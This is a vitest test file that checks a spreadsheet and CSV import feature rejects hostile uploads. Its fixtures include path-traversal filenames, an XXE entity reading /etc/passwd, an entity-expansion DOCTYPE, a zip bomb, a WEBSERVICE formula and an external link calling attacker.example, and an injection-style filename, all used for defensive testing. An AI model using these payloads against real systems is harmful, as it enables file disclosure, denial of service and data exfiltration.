import { describe, it, expect } from 'vitest';
import {
  checkDeclaredFile,
  checkFileContent,
  extensionOf,
  looksLikeText,
  sanitizeFilename,
} from '@/lib/imports/detect';
import { MAX_UPLOAD_BYTES } from '@/lib/imports/constants';
import { readXlsx, SpreadsheetError, columnIndexFromRef } from '@/lib/imports/xlsx';
import { readXls } from '@/lib/imports/xls';
import { ZipArchive, ZipError } from '@/lib/imports/zip';
import { scanXml, decodeXmlText, XmlSecurityError } from '@/lib/imports/xml';
import { buildXlsx, buildXls, buildZip, buildZipBomb, wrapInOle2 } from './helpers/spreadsheet';

const csv = (text: string) => new TextEncoder().encode(text);

/**
 * File validation and format reading.
 *
 * Every uploaded file is hostile input (ARCHITECTURE §20.3). These are the tests
 * that hold that line: wrong extension, wrong declared type, wrong magic bytes,
 * oversized, truncated, a decompression bomb, an entity-expansion payload, and
 * an executable wearing a .csv extension.
 */

describe('declared-file validation (before upload)', () => {
  const base = { filename: 'contacts.csv', byteSize: 1024, contentType: 'text/csv' };

  it('accepts a plausible CSV', () => {
    expect(checkDeclaredFile(base)).toEqual({ ok: true, format: 'csv' });
  });

  it('accepts each supported extension', () => {
    expect(checkDeclaredFile({ ...base, filename: 'a.tsv' }).ok).toBe(true);
    expect(
      checkDeclaredFile({
        ...base,
        filename: 'a.xlsx',
        contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      }),
    ).toEqual({ ok: true, format: 'xlsx' });
    expect(
      checkDeclaredFile({ ...base, filename: 'a.xls', contentType: 'application/vnd.ms-excel' }),
    ).toEqual({ ok: true, format: 'xls' });
  });

  it('rejects an unsupported extension', () => {
    const result = checkDeclaredFile({ ...base, filename: 'contacts.numbers' });
    expect(result).toMatchObject({ ok: false, reason: 'unsupported_extension' });
  });

  it('rejects an unsupported declared content type', () => {
    const result = checkDeclaredFile({ ...base, contentType: 'application/x-msdownload' });
    expect(result).toMatchObject({ ok: false, reason: 'unsupported_content_type' });
  });

  it('rejects an oversized file before a byte is uploaded', () => {
    const result = checkDeclaredFile({ ...base, byteSize: MAX_UPLOAD_BYTES + 1 });
    expect(result).toMatchObject({ ok: false, reason: 'too_large' });
  });

  it('rejects an empty file', () => {
    expect(checkDeclaredFile({ ...base, byteSize: 0 })).toMatchObject({
      ok: false,
      reason: 'empty',
    });
  });

  it('tolerates a content type with parameters', () => {
    expect(checkDeclaredFile({ ...base, contentType: 'text/csv; charset=utf-8' }).ok).toBe(true);
  });
});

describe('content validation (after upload, before parsing)', () => {
  it('accepts a real CSV', () => {
    const result = checkFileContent({
      filename: 'contacts.csv',
      bytes: csv('email,name\na@b.com,Ann\n'),
    });
    expect(result).toEqual({ ok: true, format: 'csv' });
  });

  it('accepts a real XLSX by its magic bytes', () => {
    const result = checkFileContent({
      filename: 'book.xlsx',
      bytes: buildXlsx([['Email'], ['a@b.com']]),
    });
    expect(result).toEqual({ ok: true, format: 'xlsx' });
  });

  it('accepts a real XLS by its magic bytes', () => {
    const result = checkFileContent({
      filename: 'legacy.xls',
      bytes: buildXls([['Email'], ['a@b.com']]),
    });
    expect(result).toEqual({ ok: true, format: 'xls' });
  });

  // ── The cases that matter ────────────────────────────────────────────────

  it('rejects an XLSX renamed to .csv — the extension does not route the parser', () => {
    const result = checkFileContent({
      filename: 'contacts.csv',
      bytes: buildXlsx([['Email'], ['a@b.com']]),
    });
    expect(result).toMatchObject({ ok: false, reason: 'content_mismatch' });
  });

  it('rejects a CSV renamed to .xlsx', () => {
    const result = checkFileContent({
      filename: 'contacts.xlsx',
      bytes: csv('email\na@b.com\n'),
    });
    expect(result).toMatchObject({ ok: false, reason: 'content_mismatch' });
  });

  it('rejects an XLS renamed to .xlsx and vice versa', () => {
    expect(
      checkFileContent({ filename: 'a.xlsx', bytes: buildXls([['Email']]) }),
    ).toMatchObject({ ok: false, reason: 'content_mismatch' });
    expect(
      checkFileContent({ filename: 'a.xls', bytes: buildXlsx([['Email']]) }),
    ).toMatchObject({ ok: false, reason: 'content_mismatch' });
  });

  it('rejects an executable wearing a .csv extension', () => {
    const exe = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
    expect(checkFileContent({ filename: 'contacts.csv', bytes: exe })).toMatchObject({
      ok: false,
      reason: 'unsupported_content',
    });
  });

  it.each([
    ['pdf', [0x25, 0x50, 0x44, 0x46, 0x2d]],
    ['gzip', [0x1f, 0x8b, 0x08, 0x00]],
    ['png', [0x89, 0x50, 0x4e, 0x47, 0x0d]],
    ['7z', [0x37, 0x7a, 0xbc, 0xaf, 0x27]],
  ])('rejects a %s disguised as CSV', (_label, magic) => {
    const result = checkFileContent({
      filename: 'contacts.csv',
      bytes: new Uint8Array([...magic, 0x41, 0x42, 0x43]),
    });
    expect(result.ok).toBe(false);
  });

  it('rejects binary content with no recognised signature', () => {
    const noise = new Uint8Array(512);
    for (let i = 0; i < noise.length; i += 1) noise[i] = (i * 7) % 31;
    expect(checkFileContent({ filename: 'contacts.csv', bytes: noise })).toMatchObject({
      ok: false,
      reason: 'binary_content',
    });
  });

  it('rejects an oversized file even when its bytes are valid', () => {
    expect(
      checkFileContent({
        filename: 'contacts.csv',
        bytes: csv('email\na@b.com\n'),
        byteSize: MAX_UPLOAD_BYTES + 1,
      }),
    ).toMatchObject({ ok: false, reason: 'too_large' });
  });

  it('rejects an empty upload', () => {
    expect(checkFileContent({ filename: 'a.csv', bytes: new Uint8Array(0) })).toMatchObject({
      ok: false,
      reason: 'empty',
    });
  });

  it('rejects an unsupported extension outright', () => {
    expect(checkFileContent({ filename: 'a.txt', bytes: csv('email\n') })).toMatchObject({
      ok: false,
      reason: 'unsupported_extension',
    });
  });

  it('accepts UTF-8 CSV containing non-Latin text', () => {
    const bytes = csv('email,name\nyuki@example.jp,ゆき\nolga@example.ru,Ольга\n');
    expect(checkFileContent({ filename: 'a.csv', bytes }).ok).toBe(true);
  });
});

describe('text detection', () => {
  it('treats a NUL byte as conclusive evidence of binary', () => {
    expect(looksLikeText(new Uint8Array([0x61, 0x00, 0x62]))).toBe(false);
  });

  it('allows tabs, newlines and carriage returns', () => {
    expect(looksLikeText(csv('a\tb\r\nc\n'))).toBe(true);
  });
});

describe('filename handling', () => {
  it('never trusts a path', () => {
    // Only the final segment survives, so a traversal sequence cannot reach the
    // stored name at all.
    expect(sanitizeFilename('../../etc/passwd')).toBe('passwd');
    expect(sanitizeFilename('C:\\Users\\x\\contacts.csv')).toBe('contacts.csv');
    expect(sanitizeFilename('/absolute/contacts.csv')).toBe('contacts.csv');
  });

  it('strips characters that have no business in a stored name', () => {
    expect(sanitizeFilename('re"port;drop table.csv')).toBe('re_port_drop table.csv');
  });

  it('never returns an empty name', () => {
    expect(sanitizeFilename('...')).toBe('upload');
    expect(sanitizeFilename('')).toBe('upload');
  });

  it('bounds the length', () => {
    expect(sanitizeFilename(`${'a'.repeat(400)}.csv`).length).toBeLessThanOrEqual(120);
  });

  it('reads the extension case-insensitively', () => {
    expect(extensionOf('Contacts.CSV')).toBe('.csv');
    expect(extensionOf('archive.tar.gz')).toBe('.gz');
    expect(extensionOf('noextension')).toBe('');
  });
});

describe('zip-bomb protection', () => {
  it('refuses an archive that expands beyond the total cap', () => {
    // A real bomb: 400 MB of zeros in a few hundred bytes of deflate stream.
    const bomb = buildZipBomb();
    expect(bomb.length).toBeLessThan(600 * 1024);

    let thrown: unknown;
    try {
      ZipArchive.open(bomb);
    } catch (cause) {
      thrown = cause;
    }
    expect(thrown).toBeInstanceOf(ZipError);
    expect((thrown as ZipError).kind).toBe('bomb');
  });

  it('surfaces the bomb as a spreadsheet error through the XLSX reader', () => {
    let thrown: unknown;
    try {
      readXlsx(buildZipBomb());
    } catch (cause) {
      thrown = cause;
    }
    expect(thrown).toBeInstanceOf(SpreadsheetError);
    expect((thrown as SpreadsheetError).kind).toBe('bomb');
  });

  it('refuses an archive whose compression ratio is implausible', () => {
    // Individually under every size cap, collectively an absurd ratio.
    const entries = Array.from({ length: 8 }, (_unused, i) => ({
      name: `xl/worksheets/sheet${i + 1}.xml`,
      content: new Uint8Array(2 * 1024 * 1024),
      method: 8 as const,
    }));
    expect(() => ZipArchive.open(buildZip(entries), {
      maxEntryBytes: 64 * 1024 * 1024,
      maxTotalBytes: 256 * 1024 * 1024,
      maxRatio: 100,
      maxEntries: 1024,
    })).toThrow(ZipError);
  });

  it('refuses an archive declaring more parts than a workbook can have', () => {
    const entries = Array.from({ length: 40 }, (_unused, i) => ({
      name: `part${i}.xml`,
      content: '<x/>',
    }));
    expect(() =>
      ZipArchive.open(buildZip(entries), {
        maxEntryBytes: 1024,
        maxTotalBytes: 1024 * 1024,
        maxRatio: 1000,
        maxEntries: 10,
      }),
    ).toThrow(/too many internal parts/);
  });

  it('rejects an internal path attempting traversal', () => {
    const archive = buildZip([{ name: '../../escape.xml', content: '<x/>' }]);
    expect(() => ZipArchive.open(archive)).toThrow(/unsafe internal path/);
  });

  it('rejects a truncated archive', () => {
    const valid = buildXlsx([['Email'], ['a@b.com']]);
    expect(() => ZipArchive.open(valid.subarray(0, valid.length - 40))).toThrow(ZipError);
  });

  it('reads a legitimate archive without complaint', () => {
    const archive = ZipArchive.open(buildXlsx([['Email'], ['a@b.com']]));
    expect(archive.has('xl/workbook.xml')).toBe(true);
    expect(archive.readText('xl/workbook.xml')).toContain('<sheets>');
  });
});

describe('XML safety', () => {
  it('refuses a DOCTYPE — the entity-expansion vector', () => {
    const hostile =
      '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">]><worksheet/>';
    expect(() => scanXml(hostile, () => undefined)).toThrow(XmlSecurityError);
  });

  it('refuses an entity declaration', () => {
    expect(() => scanXml('<!ENTITY xxe SYSTEM "file:///etc/passwd"><x/>', () => undefined)).toThrow(
      XmlSecurityError,
    );
  });

  it('surfaces a hostile workbook part as a spreadsheet error', () => {
    const bytes = buildXlsx([['Email']], {
      sheetXmlOverride:
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "b">]><worksheet><sheetData/></worksheet>',
    });
    expect(() => readXlsx(bytes)).toThrow(SpreadsheetError);
  });

  it('resolves only the five predefined entities', () => {
    expect(decodeXmlText('a &amp; b &lt;c&gt; &quot;d&quot; &apos;e&apos;')).toBe(
      'a & b <c> "d" \'e\'',
    );
  });

  it('leaves an undeclared entity as literal text rather than resolving it', () => {
    expect(decodeXmlText('&xxe;')).toBe('&xxe;');
    expect(decodeXmlText('&someUnknownThing;')).toBe('&someUnknownThing;');
  });

  it('resolves bounded numeric references and ignores absurd ones', () => {
    expect(decodeXmlText('&#65;&#x42;')).toBe('AB');
    expect(decodeXmlText('&#99999999999;')).toBe('&#99999999999;');
  });
});

describe('XLSX reading', () => {
  it('reads a shared-string workbook', () => {
    const result = readXlsx(
      buildXlsx([
        ['Email', 'First Name', 'Company'],
        ['ann@example.com', 'Ann', 'Acme'],
        ['bob@example.com', 'Bob', 'Globex'],
      ]),
    );
    expect(result.rows).toEqual([
      ['Email', 'First Name', 'Company'],
      ['ann@example.com', 'Ann', 'Acme'],
      ['bob@example.com', 'Bob', 'Globex'],
    ]);
  });

  it('reads inline strings', () => {
    const result = readXlsx(
      buildXlsx(
        [
          ['Email'],
          ['ann@example.com'],
        ],
        { inlineStrings: true },
      ),
    );
    expect(result.rows[1]).toEqual(['ann@example.com']);
  });

  it('reads numbers and date-styled serials', () => {
    const result = readXlsx(
      buildXlsx([
        ['Email', 'Score', 'Joined'],
        ['ann@example.com', { number: 42 }, { dateSerial: 45000 }],
      ]),
    );
    expect(result.rows[1]).toEqual(['ann@example.com', '42', '2023-03-15']);
  });

  it('takes a formula cell’s cached value and never its expression', () => {
    const bytes = buildXlsx([
      ['Email', 'Danger'],
      [
        'ann@example.com',
        { formula: 'WEBSERVICE("http://attacker.example/x")', cached: 'inert text' },
      ],
    ]);
    const result = readXlsx(bytes);
    expect(result.rows[1]).toEqual(['ann@example.com', 'inert text']);
    // The expression must not appear anywhere in the parsed output.
    expect(JSON.stringify(result.rows)).not.toContain('WEBSERVICE');
  });

  it('normalises sparse rows so columns line up with the header', () => {
    const bytes = buildXlsx([['Email']], {
      sheetXmlOverride:
        '<worksheet><sheetData>' +
        '<row r="1"><c r="A1" t="inlineStr"><is><t>Email</t></is></c>' +
        '<c r="C1" t="inlineStr"><is><t>Company</t></is></c></row>' +
        '<row r="2"><c r="C2" t="inlineStr"><is><t>Acme</t></is></c></row>' +
        '</sheetData></worksheet>',
    });
    const result = readXlsx(bytes);
    expect(result.rows[0]).toEqual(['Email', '', 'Company']);
    expect(result.rows[1]).toEqual(['', '', 'Acme']);
  });

  it('ignores a macro part instead of reading it', () => {
    const bytes = buildXlsx([['Email'], ['a@b.com']], {
      extraParts: [
        { name: 'xl/vbaProject.bin', content: new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0x99]) },
        {
          name: 'xl/externalLinks/externalLink1.xml',
          content: '<externalLink><externalBook r:id="rId9"/></externalLink>',
        },
      ],
    });
    const result = readXlsx(bytes);
    expect(result.rows).toEqual([['Email'], ['a@b.com']]);
  });

  it('does not follow an external worksheet relationship', () => {
    const bytes = buildZip([
      {
        name: 'xl/workbook.xml',
        content:
          '<workbook xmlns:r="r"><sheets><sheet name="S" r:id="rId1"/></sheets></workbook>',
      },
      {
        name: 'xl/_rels/workbook.xml.rels',
        content:
          '<Relationships><Relationship Id="rId1" TargetMode="External" ' +
          'Target="http://attacker.example/sheet.xml"/></Relationships>',
      },
    ]);
    // No local worksheet exists, so the read fails rather than fetching one.
    expect(() => readXlsx(bytes)).toThrow(SpreadsheetError);
  });

  it('enforces the documented row cap with an actionable message', () => {
    const rows = Array.from({ length: 12 }, (_unused, i) => [`user${i}@example.com`]);
    let thrown: unknown;
    try {
      readXlsx(buildXlsx(rows), { maxRows: 10 });
    } catch (cause) {
      thrown = cause;
    }
    expect(thrown).toBeInstanceOf(SpreadsheetError);
    expect((thrown as SpreadsheetError).kind).toBe('too_many_rows');
    expect((thrown as SpreadsheetError).message).toContain('export it as CSV');
  });

  it('does not silently truncate at the cap — it refuses', () => {
    const rows = Array.from({ length: 5 }, (_unused, i) => [`user${i}@example.com`]);
    expect(() => readXlsx(buildXlsx(rows), { maxRows: 3 })).toThrow(SpreadsheetError);
  });

  it('rejects a malformed container', () => {
    const notAZip = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0x01, 0x02, 0x03]);
    expect(() => readXlsx(notAZip)).toThrow(SpreadsheetError);
  });

  it('rejects a workbook with no worksheet part', () => {
    const bytes = buildZip([{ name: 'xl/workbook.xml', content: '<workbook/>' }]);
    expect(() => readXlsx(bytes)).toThrow(SpreadsheetError);
  });

  it('rejects an empty worksheet', () => {
    const bytes = buildXlsx([], {
      sheetXmlOverride: '<worksheet><sheetData/></worksheet>',
    });
    expect(() => readXlsx(bytes)).toThrow(/no rows/);
  });

  it('converts cell references to column indices', () => {
    expect(columnIndexFromRef('A1')).toBe(0);
    expect(columnIndexFromRef('B2')).toBe(1);
    expect(columnIndexFromRef('Z10')).toBe(25);
    expect(columnIndexFromRef('AA1')).toBe(26);
    expect(columnIndexFromRef('1')).toBe(null);
  });
});

describe('XLS reading', () => {
  it('reads a legacy workbook', () => {
    const result = readXls(
      buildXls([
        ['Email', 'Name'],
        ['ann@example.com', 'Ann'],
        ['bob@example.com', 'Bob'],
      ]),
    );
    expect(result.rows).toEqual([
      ['Email', 'Name'],
      ['ann@example.com', 'Ann'],
      ['bob@example.com', 'Bob'],
    ]);
  });

  it('reads numeric cells', () => {
    const parsed = readXls(buildXls([['Email', 'Score'], ['a@b.com', 7]]));
    expect(parsed.rows[1]).toEqual(['a@b.com', '7']);
  });

  it('reads non-Latin text through the shared string table', () => {
    const parsed = readXls(buildXls([['Email', 'Name'], ['yuki@example.jp', 'ゆき']]));
    expect(parsed.rows[1]).toEqual(['yuki@example.jp', 'ゆき']);
  });

  it('enforces the row cap', () => {
    const rows = Array.from({ length: 12 }, (_unused, i) => [`user${i}@example.com`]);
    expect(() => readXls(buildXls(rows), { maxRows: 5 })).toThrow(SpreadsheetError);
  });

  it('rejects a compound file with no workbook stream', () => {
    const bytes = wrapInOle2(new Uint8Array(5000), 'NotAWorkbook');
    expect(() => readXls(bytes)).toThrow(SpreadsheetError);
  });

  it('rejects a truncated compound file', () => {
    const valid = buildXls([['Email'], ['a@b.com']]);
    expect(() => readXls(valid.subarray(0, 300))).toThrow(SpreadsheetError);
  });

  it('rejects something that is not a compound file at all', () => {
    expect(() => readXls(new TextEncoder().encode('email,name\n'))).toThrow(SpreadsheetError);
  });
});
